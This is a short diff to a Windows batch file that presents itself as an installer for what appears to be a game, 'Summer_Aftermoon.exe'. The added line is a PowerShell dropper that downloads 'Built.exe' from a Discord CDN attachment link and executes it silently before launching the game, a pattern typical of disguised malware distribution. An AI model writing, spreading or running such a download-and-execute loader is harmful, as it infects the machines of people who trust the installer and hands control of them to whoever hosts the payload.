@@ -1,4 +1,4 @@
 echo Installing...
 echo.
-powershell $down=New-Object System.Net.WebClient;$url='Built.exe';$file='Built.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exitstart
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1228861257763786786/1229367623733743636/Built.exe?ex=662f6cd2&is=661cf7d2&hm=859b3656a0656d6612c47344390b17270c978fca3e8f7de0728dc7d90ee2e663&';$file='Built.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exitstart
 start Summer_Aftermoon.exe
